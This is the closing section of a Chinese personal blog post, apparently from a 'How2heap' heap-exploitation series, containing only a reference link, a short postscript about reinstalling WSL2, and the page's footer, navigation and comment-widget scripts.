<h1 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h1><p>【1】<a target="_blank" rel="noopener" href="https://blog.csdn.net/kelxLZ/article/details/112972504">https://blog.csdn.net/kelxLZ/article/details/112972504</a><br>​</p>
<p>​</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>因为之前把 wsl2 搞崩了，为了这个实验，又又又重装了一次<br>卸载过程参考：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39522282/article/details/86168907">https://blog.csdn.net/qq_39522282/article/details/86168907</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/gzroy/article/details/104069536">https://blog.csdn.net/gzroy/article/details/104069536</a></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">M@tr1x</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.blog.hackerjerry.top/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/">https://www.blog.hackerjerry.top/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.blog.hackerjerry.top" target="_blank">M@tr1xの日常</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://image.hackerjerry.top/2427682894.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/06/17/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20_new/"><img class="prev-cover" data-lazy-src="https://image.hackerjerry.top/2427682894.jpeg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">生活周报-June-14-to-20</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/26/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)_new/"><img class="next-cover" data-lazy-src="https://image.hackerjerry.top/2427682894.jpeg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PAT算法刷题(2)</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By M@tr1x</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">冷風熱血，荡涤乾坤</div><div class="icp"><a target="_blank" rel="noopener" href="http://www.beian.miit.gov.cn"><img class="icp-icon" src="/img/icp.png"/><span>陕ICP备19023179号</span></a></div><div class="cdn"><a href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" target="_blank"><img src="/img/upyun.png" width="70px"/><span></span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    window.valine = new Valine({
      el: '#vcomment',
      appId: 'jApqS8Xxcc1eST53AyiAisFx-gzGzoHsz',
      appKey: 'iyngroaUslATD8V4nOgOHowr',
      placeholder: '说点什么呗~',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: true,
      path: window.location.pathname,
    });
    if ('nick,mail') { valine.config.requiredFields= 'nick,mail'.split(',') }
  }

  if (typeof Valine === 'function') initValine() 
  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>